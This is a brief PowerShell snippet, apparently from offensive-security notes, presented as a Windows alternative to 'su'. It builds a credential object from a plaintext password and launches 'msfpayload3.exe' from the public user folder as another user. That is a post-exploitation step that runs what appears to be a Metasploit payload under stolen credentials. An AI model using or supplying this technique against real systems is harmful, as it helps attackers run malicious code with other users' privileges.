# Alternative to "su <user>" or something like that in Windows boxes

$secpasswd = ConvertTo-SecureString "<PWD>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<username>", $secpasswd)
$computer = "<COMPUTER_NAME>"
[System.Diagnostics.Process]::Start("C:\Users\public\msfpayload3.exe","", $mycreds.Username, $mycreds.Password, $computer)
